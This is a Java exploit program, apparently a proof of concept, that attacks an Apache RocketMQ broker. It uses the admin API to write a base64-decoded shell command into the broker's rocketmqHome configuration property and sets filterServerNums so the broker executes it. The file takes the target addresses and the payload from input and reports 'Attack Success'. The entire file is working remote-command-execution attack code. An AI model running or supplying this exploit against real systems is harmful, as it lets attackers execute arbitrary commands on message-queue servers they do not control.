import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;

import java.util.Arrays;
import java.util.Base64;
import java.util.Properties;
import java.util.Scanner;

public class EXP {
    public static void main(String[]args) throws Exception {
        // 获取输入
        Scanner scanner = new Scanner(System.in);
        String nameSrvAddr = scanner.nextLine();
        String brokerChangeConfig = scanner.nextLine();
        String evil = scanner.nextLine();
        // nameSrvAddr = 10.50.50.12:9876
        // brokerChangeConfig = 10.50.50.12:10911
        System.out.println("目标 RocketMQ nameSrvAddr 为: " + nameSrvAddr);
        System.out.println("目标 RocketMQ BrokerConfig 为: " + brokerChangeConfig);
        System.out.println("对应的 payload 为: " + Arrays.toString(Base64.getDecoder().decode(evil)));

        // 创建 Properties 对象
        Properties props = new Properties();
        // props.setProperty("rocketmqHome","-c {echo,dG91Y2ggL3RtcC9zdWNjZXNz}|{base64,-d}|bash -c");
        String payload = String.format("-c {echo,%s}|{base64,-d}|bash -c",evil);
        props.setProperty("rocketmqHome", payload);
        props.setProperty("filterServerNums","1");
        // 创建 DefaultMQAdminExt 对象并启动
        DefaultMQAdminExt defaultMQAdminExt = new DefaultMQAdminExt();
        defaultMQAdminExt.setNamesrvAddr(nameSrvAddr);
        defaultMQAdminExt.start();
        // 更新配置⽂件
        defaultMQAdminExt.updateBrokerConfig(brokerChangeConfig, props);
        Properties brokerConfig = defaultMQAdminExt.getBrokerConfig(brokerChangeConfig);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        // 关闭 DefaultMQAdminExt 对象
        defaultMQAdminExt.shutdown();
        System.out.println("Attack Success");
        }

}